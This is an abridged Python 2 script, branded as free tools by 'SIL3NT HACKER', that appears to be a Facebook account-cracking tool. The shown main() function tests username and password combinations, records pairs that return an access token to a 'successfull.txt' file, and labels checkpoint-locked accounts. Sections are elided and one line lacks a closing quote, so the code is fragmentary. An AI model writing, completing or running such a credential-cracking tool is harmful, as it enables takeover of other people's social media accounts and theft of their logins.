#Tools Created By SIL3NT HACKER
# IT'S FREE TOOLS
...
print("\033[0;91mThis Tool's Free By Silent786")
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : Silent-Hacker'
    print '\033[0;94mFACEBOOK : Shahzada Ahmed Sajjad'
    print '\033[0;96mGITHUB   : SHAHZADA-AHMED
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[S.H.R-HACKE]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m [S-H-R CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
